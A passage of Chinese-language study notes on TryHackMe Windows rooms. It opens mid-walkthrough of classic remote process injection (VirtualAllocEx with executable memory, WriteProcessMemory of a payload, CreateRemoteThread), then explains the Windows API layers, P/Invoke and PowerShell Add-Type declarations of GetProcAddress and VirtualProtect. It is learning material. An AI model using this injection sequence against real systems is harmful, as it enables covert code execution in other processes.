font-style: italic">// remoteBuffer 存储这个新分配区域的地址</span></span><span class="line"><span style="color: #ABB2BF">remoteBuffer </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">hProcess,</span><span style="color: #7F848E; font-style: italic"> // 打开的目标进程的句柄</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 操作系统来决定分配内存的最佳位置</span></span><span class="line"><span style="color: #ABB2BF">sizeof payload,</span><span style="color: #7F848E; font-style: italic"> // 内存分配区域的大小</span></span><span class="line"><span style="color: #ABB2BF">(MEM_RESERVE </span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF"> MEM_COMMIT),</span><span style="color: #7F848E; font-style: italic"> // 预留然后提交</span></span><span class="line"><span style="color: #ABB2BF">PAGE_EXECUTE_READWRITE</span><span style="color: #7F848E; font-style: italic"> // 对提交区域开启执行和读写权限</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>第三步，我们可以使用 <code>WriteProcessMemory</code> 将有效载荷写入已分配的内存区域。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">hProcess,</span><span style="color: #7F848E; font-style: italic"> // 打开的目标进程的句柄</span></span><span class="line"><span style="color: #ABB2BF">remoteBuffer,</span><span style="color: #7F848E; font-style: italic"> // 上一步分派的内存区域</span></span><span class="line"><span style="color: #ABB2BF">payload,</span><span style="color: #7F848E; font-style: italic"> // 要写入的数据</span></span><span class="line"><span style="color: #ABB2BF">sizeof payload,</span><span style="color: #7F848E; font-style: italic"> // 数据的字节大小</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic"> // 不返回实际写入的字节数</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p><code> WriteProcessMemory</code>的完整函数签名是这样的：</p><figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">BOOL</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">( </span><span style="color: #E5C07B">HANDLE</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">hProcess</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">LPVOID</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">lpBaseAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">LPVOID</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">lpBuffer</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">SIZE_T</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">nSize</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">SIZE_T</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">lpNumberOfBytesWritten</span><span style="color: #ABB2BF"> );</span></span></code></pre></div></div></figure><ul><li><code>lpNumberOfBytesWritten</code>：这个参数是一个可选的<strong>指针</strong>。如果你传入一个有效的地址，<code>WriteProcessMemory</code> 函数会将实际写入的字节数写入到这个地址。</li><li><code>NULL</code>：当你传入 <code>NULL</code> 时，就表示你<strong>不关心</strong>实际写入了多少字节，你只希望函数执行写入操作。</li></ul><p>第四步，我们可以使用 <code>CreateRemoteThread</code> 从内存中执行我们的有效载荷。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// CreateRemoteThread：这个函数是 Windows API 中最经典的远程线程创建函数。它在目标进程内创建一个新的线程。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// remoteThread：一个 HANDLE 类型的变量，它将存储新创建的线程的句柄。有了这个句柄，你就可以控制这个线程，例如等待它完成或终止它。</span></span><span class="line"><span style="color: #ABB2BF">remoteThread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">hProcess,</span><span style="color: #7F848E; font-style: italic"> // 打开的目标进程的句柄，也就是要在哪个进程里面创建线程</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 这个参数是用来设置线程的安全属性的，传入 NULL 表示使用默认的安全描述符。</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 栈的默认大小</span></span><span class="line"><span style="color: #ABB2BF">(LPTHREAD_START_ROUTINE)remoteBuffer,</span><span style="color: #7F848E; font-style: italic"> // 这是一个类型转换，它告诉 CreateRemoteThread，remoteBuffer 指向的是一个线程可以开始执行的函数。</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 这是传递给新线程的参数。如果你的注入代码（payload）需要一个参数，就会在这里传入。</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 传入 0 表示线程创建后立即开始执行。</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic"> // 一个可选参数，用于接收新线程的 ID。传入 NULL 表示你不关心新线程的 ID。</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>这个房间需要一些 Windows 开发相关的知识，如果不懂那些，光靠房间本身的解释是不够的，尤其是那些方法签名。房间只给你写好了示例，但是不给你解释每个方法形参的详细作用，导致理解很困难，上面的大部分都是靠 AI 来帮忙来理解的，光记录这个房间就用了我一下午的时间，不过收获很大。</p><h1 id="Introduction-to-Windows-API"><a href="#Introduction-to-Windows-API" class="headerlink" title="Introduction to Windows API"></a>Introduction to Windows API</h1><p>这个房间呢，则是介绍了 Windows API 的组成，和一些调用 API 的方式，总体来说是概念为主，告诉了我们大部分攻防措施都是通过 API 来实现的，比如说 Hook API 以监测 API 的调用。这个房间要对操作系统架构有一个概念性的理解，就是那个操作系统分层模型。</p><h2 id="Windows-API-的组成部分"><a href="#Windows-API-的组成部分" class="headerlink" title="Windows API 的组成部分"></a>Windows API 的组成部分</h2><p>自上而下分解 Windows API</p><table><thead><tr><th><strong>Layer</strong></th><th><strong>Explanation</strong></th></tr></thead><tbody><tr><td>API</td><td>一个顶层&#x2F;通用术语或理论，用于描述在 win32 API 结构中找到的任何调用。</td></tr><tr><td>Header files or imports</td><td>定义了在运行时导入的库，这些库由头文件或库导入定义。使用指针获取函数地址。</td></tr><tr><td>Core DLLs</td><td>定义调用结构的四个 DLL 组。（KERNEL32、USER32 和 ADVAPI32）。这些 DLL 定义了不包含在单个子系统中的内核和用户服务。</td></tr><tr><td>Supplemental DLLs</td><td>Windows API 中定义的其他 DLL。控制 Windows 操作系统的独立子系统。约 36 个其他已定义的 DLL。（NTDLL、COM、FVEAPI 等）</td></tr><tr><td>Call Structures</td><td>定义 API 调用本身和调用的参数。</td></tr><tr><td>API Calls</td><td>程序中使用的 API 调用，其函数地址通过指针获取。</td></tr><tr><td>In&#x2F;Out Parameters</td><td>由调用结构定义的参数值。</td></tr></tbody></table><h2 id="OS-Libraries-系统库"><a href="#OS-Libraries-系统库" class="headerlink" title="OS Libraries 系统库"></a>OS Libraries 系统库</h2><p>Win32 库的每个 API 调用都驻留在内存中，需要一个指向<strong>该函数的内存地址</strong>的指针。由于 ASLR（地址空间布局随机化），没法直接定位到这个函数，所以需要程序通过一个特定的机制去动态的定位这些函数的地址。比如说在 DLL 加载到内存后，通过 <code>GetProcAddress</code> 去查询需要的函数名，以获取他的内存地址。</p><h3 id="Windows-Header-File-头文件"><a href="#Windows-Header-File-头文件" class="headerlink" title="Windows Header File 头文件"></a>Windows Header File 头文件</h3><p>微软发布了 Windows 头文件，解决因为 ASLR 获取不到 API 地址的解决方案。</p><p>我们在编写自己的程序中，可以导入 <code>windows.h</code> 。他包含了几乎所有 Win32 API 函数的声明、数据类型和宏定义。它告诉你的程序，像 <code>MessageBox</code>、<code>CreateRemoteThread</code> 这样的函数是存在的，以及它们的参数和返回值类型。</p><p>在运行时，通过操作系统提供的动态加载机制（例如 <code>LoadLibrary</code> 和 <code>GetProcAddress</code>），我们能根据函数名动态地找到它的真实地址。</p><h3 id="P-Invoke-机制和托管代码"><a href="#P-Invoke-机制和托管代码" class="headerlink" title="P&#x2F;Invoke 机制和托管代码"></a>P&#x2F;Invoke 机制和托管代码</h3><p>我们之前聊过，像 C# 这样的<strong>托管代码</strong>（Managed Code）运行在 <strong>CLR</strong> (Common Language Runtime) 之下。CLR 会管理内存、提供垃圾回收，并保护你免受很多底层错误的困扰。</p><p>而 <strong>Win32 API</strong> 是 <strong>非托管代码</strong>（Unmanaged Code），它直接与操作系统交互，不被 CLR 管理。</p><p>如果你的 C# 程序想调用一个 Win32 API 函数（例如 <code>MessageBoxA</code>），它不能直接调用，因为它们属于不同的“世界”。这个过程就像你在写 C++ 代码中用到汇编代码一样（ffmpeg）。</p><p>下面的代码从系统运行时里面导入了 <code>InteropServices</code> 命名空间，里面有一个 <code>DllImport</code> 特性，后面会紧跟着一个<strong>函数声明</strong>，这个声明告诉运行时，在 <code>user32.dll</code> 中有一个叫 <code>MessageBox</code> 的函数，它接受一些参数，并返回一个整数。</p><p>只要声明之后就可以在 C# 代码中直接像调用普通方法一样调用 <code>MessageBox</code>。<code>extern</code> 关键字告诉 C# 编译器，这个函数<strong>不是在当前代码文件中实现的</strong>。</p><p>当你使用 <code>[DllImport]</code> 特性时，你实际上是在创建一个外部方法的声明。这个声明需要用 <code>extern</code> 关键字来修饰，因为它所指向的实际代码位于非托管的 DLL 文件中。</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 导入了 InteropServices 命名空间，它包含了所有与托管和非托管代码交互相关的类和特性，包括 DllImport</span></span><span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InteropServices</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Program</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// &quot;user32.dll&quot;: 指定了我们要从哪个 DLL 文件中导入函数。user32.dll 是 Windows 操作系统的一个核心 DLL，包含了图形用户界面相关的函数，比如 MessageBox。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// CharSet = CharSet.Unicode: 这个参数告诉运行时，在调用非托管函数时，字符串应该使用 Unicode 字符集。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // SetLastError = true: 这是一个非常重要的参数，它告诉运行时，在调用非托管函数后，如果函数失败了，要保存 Windows 系统的错误代码。你可以通过 Marshal.GetLastWin32Error() 方法来获取这个错误代码。</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user32.dll&quot;</span><span style="color: #ABB2BF">, CharSet </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">CharSet</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Unicode</span><span style="color: #ABB2BF">, SetLastError </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">MessageBox</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">hWnd</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpText</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpCaption</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">uType</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>现在就可以把这个函数当成托管方法调用了，尽管他是非托管方法。</p><h2 id="API-Call-Structure-API-调用结构"><a href="#API-Call-Structure-API-调用结构" class="headerlink" title="API Call Structure API 调用结构"></a>API Call Structure API 调用结构</h2><p>API 调用是 Win32 库的第二个主要组成部分。具体的 Win32 API 调用可以参考 <a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API documentation</a> 和 <a href="http://pinvoke.net/">pinvoke.net</a>。</p><h3 id="附加字符"><a href="#附加字符" class="headerlink" title="附加字符"></a>附加字符</h3><p>API 调用功能可以通过附加一个代表性字符来扩展，这是微软 Win32 API 函数的<strong>命名约定</strong>，我们作为开发者只需要按照这个<strong>命名规则</strong>去调用正确的函数版本。</p><table><thead><tr><th><strong>字符</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>A</td><td>表示使用 ANSI 编码的 8 位字符集</td></tr><tr><td>W</td><td>代表 Unicode 编码</td></tr><tr><td>Ex</td><td>为 API 调用提供扩展功能或输入&#x2F;输出参数</td></tr></tbody></table><p>更多示例参考微软文档：<a href="https://learn.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings">Working with Strings</a>，这个功能是为了向后兼容性准备的。</p><p>在之后的实践中你就会碰到很多问题了，比如说在 C 程序中，用的是 ANSI 编码，然后提供的函数没有 A 结尾的，就要手动处理函数类转换了。</p><h3 id="方法签名"><a href="#方法签名" class="headerlink" title="方法签名"></a>方法签名</h3><p>每个 API 调用都有预定义的结构来定义其输入&#x2F;输出参数。你可以在 <a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API index</a> 中相应的 API 文档里面找到。</p><p>下面是 <code>WirteProcessMemory</code> API 调用的示例，官方文档：<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory function (memoryapi.h)</a></p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">BOOL</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E06C75; font-style: italic">in</span><span style="color: #ABB2BF">]  HANDLE  hProcess,</span></span><span class="line"><span style="color: #ABB2BF">  [in]  LPVOID  lpBaseAddress,</span></span><span class="line"><span style="color: #ABB2BF">  [in]  LPCVOID lpBuffer,</span></span><span class="line"><span style="color: #ABB2BF">  [in]  SIZE_T  nSize,</span></span><span class="line"><span style="color: #ABB2BF">  [out] SIZE_T  *lpNumberOfBytesWritten</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><ul><li>[in] hProcess: 要修改的进程内存的句柄。该句柄必须对进程具有 PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION 访问权限。</li><li>[in] lpBaseAddress: 一个指向指定进程中要写入数据的基地址的指针。在数据传输发生之前，系统会验证基地址和指定大小内存中的所有数据是否可用于写入访问，如果不可访问，则函数失败。</li><li>[in] lpBuffer: 一个指向缓冲区的指针，该缓冲区包含要写入指定进程地址空间的数据。</li><li>[in] nSize: 要写入指定进程的字节数。</li><li>[out] lpNumberOfBytesWritten: 一个指向变量的指针，该变量接收传输到指定进程的字节数。此参数是可选的。如果 lpNumberOfBytesWritten 为 NULL，则忽略该参数。</li></ul><p>上一个房间用过这个函数，这里就把文档里的每个参数的作用复制过来了，最主要还是得看文档。</p><h2 id="API-Implementations-API-实现"><a href="#API-Implementations-API-实现" class="headerlink" title="API Implementations API 实现"></a>API Implementations API 实现</h2><h3 id="API-实现在-C-中"><a href="#API-实现在-C-中" class="headerlink" title="API 实现在 C 中"></a>API 实现在 C 中</h3><p>Microsoft 为 C 和 C++ 等低级编程语言提供了一套预配置的库，我们可以使用这些库来访问所需的 API 调用。这个就是上上节讲的 <code>windows.h</code> 文件，在我们的程序开头添加一个 <code>#include &lt;windows.h&gt;</code> ，导入进来就行。</p><p>下面是一个使用 <code>CreateWindowExA</code> 创建一个标题为“Hello THM!”的弹出窗口的示例，文档地址：<a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-createwindowexa">CreateWindowExA function (winuser.h)</a></p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// HWND 是窗口句柄</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// CreateWindowExA 方法签名</span></span><span class="line"><span style="color: #E5C07B">HWND</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateWindowExA</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF">  [</span><span style="color: #E06C75; font-style: italic">in</span><span style="color: #ABB2BF">]           DWORD     dwExStyle, // 窗口扩展样式（比如是否是工具窗口、是否是浮动窗口等）</span></span><span class="line"><span style="color: #ABB2BF">  [in, optional] LPCSTR    lpClassName, // 指定创建的窗口的类型或模板</span></span><span class="line"><span style="color: #ABB2BF">  [in, optional] LPCSTR    lpWindowName, // 窗口标题</span></span><span class="line"><span style="color: #ABB2BF">  [in]           DWORD     dwStyle, // 窗口的标准样式（比如是否有最大化按钮、是否可以调整大小等）</span></span><span class="line"><span style="color: #ABB2BF">  [in]           int       X, // X position</span></span><span class="line"><span style="color: #ABB2BF">  [in]           int       Y, // Y position</span></span><span class="line"><span style="color: #ABB2BF">  [in]           int       nWidth, // Width size</span></span><span class="line"><span style="color: #ABB2BF">  [in]           int       nHeight, // Height size</span></span><span class="line"><span style="color: #ABB2BF">  [in, optional] HWND      hWndParent, // 父窗口</span></span><span class="line"><span style="color: #ABB2BF">  [in, optional] HMENU     hMenu, // 菜单</span></span><span class="line"><span style="color: #ABB2BF">  [in, optional] HINSTANCE hInstance, // 与窗口关联的模块实例的句柄</span></span><span class="line"><span style="color: #ABB2BF">  [in, optional] LPVOID    lpParam // 指向一个值的指针，允许你将一个自定义的数据结构传递给窗口</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 具体的调用代码</span></span><span class="line"><span style="color: #E5C07B">HWND</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">hwnd</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateWindowsEx</span><span style="color: #ABB2BF">(</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF">CLASS_NAME, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #98C379">L&quot;Hello THM!&quot;</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF">WS_OVERLAPPEDWINDOW, </span></span><span class="line"><span style="color: #ABB2BF">CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span></span><span class="line"><span style="color: #ABB2BF">hInstance, </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #D19A66">NULL</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p><code>CreateWindowEx</code> 是 <code>CreateWindow</code> 的<strong>增强版本</strong>。</p><ul><li><strong>基础版本</strong>：<code>CreateWindow</code>。它提供了一组基本的窗口样式参数（<code>dwStyle</code>），足以创建大多数常见的窗口。</li><li><strong>扩展版本</strong>：<code>CreateWindowEx</code>。它在 <code>CreateWindow</code> 的基础上，<strong>额外</strong>添加了一个 <code>dwExStyle</code> 参数，提供了更多<strong>特殊或高级</strong>的窗口样式。</li></ul><h3 id="API-实现在-NET-and-PowerShell-中"><a href="#API-实现在-NET-and-PowerShell-中" class="headerlink" title="API 实现在 .NET and PowerShell 中"></a>API 实现在 .NET and PowerShell 中</h3><p>下面是一个示例应用程序，它使用 API 获取运行该应用程序的设备的计算机名和其他信息。</p><p>为了让 P&#x2F;Invoke 代码在 32 位和 64 位系统上都能正确编译和运行，开发者会选择使用 <code>IntPtr</code> 来映射这些可变大小的指针和句柄。<code>HANDLE</code> 在 32 位系统上是 4 字节，在 64 位系统上是 8 字节。为了让 P&#x2F;Invoke 代码在 32 位和 64 位系统上都能正确编译和运行，开发者会选择使用 <code>IntPtr</code> 来映射这些可变大小的指针和句柄。</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Win32</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #E5C07B">DllImport</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32&quot;</span><span style="color: #ABB2BF">)]</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 这里用 bool 来接收也可以，这个函数是返回成功与否</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    // 我也不清楚为什么给的 demo 用的 IntPtr 接收</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">extern</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">IntPtr</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetComputerNameA</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpBuffer</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">lpnSize</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF">[] </span><span style="color: #E5C07B">args</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">bool</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">success</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">260</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">uint</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">size</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">260</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">success</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetComputerNameA</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">name</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">size</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">Console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">WriteLine</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ToString</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>现在来介绍相同的方法如何在 PowerShell 中实现，我们需要创建一个方法而不是一个类，并添加一些额外的运算符。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">@&quot;</span></span><span class="line"><span style="color: #98C379">    [DllImport(&quot;kernel32&quot;)]</span></span><span class="line"><span style="color: #98C379">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><span class="line"><span style="color: #98C379">    [DllImport(&quot;kernel32&quot;)]</span></span><span class="line"><span style="color: #98C379">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span></span><span class="line"><span style="color: #98C379">    [DllImport(&quot;kernel32&quot;)]</span></span><span class="line"><span style="color: #98C379">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><span class="line"><span style="color: #98C379">&quot;@</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p>这些调用现在已定义，但 PowerShell 在初始化它们之前还需要一个步骤。我们必须为方法定义中每个 Win32 DLL 的指针创建一个新类型。函数 <code>Add-Type</code> 将在 <code>/temp</code> 目录中放置一个临时文件，并使用 <code>csc.exe</code> 编译所需的函数。下面是该函数的使用示例。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$Kernel32</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Add-Type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MemberDefinition </span><span style="color: #E06C75">$MethodDefinition</span><span style="color: 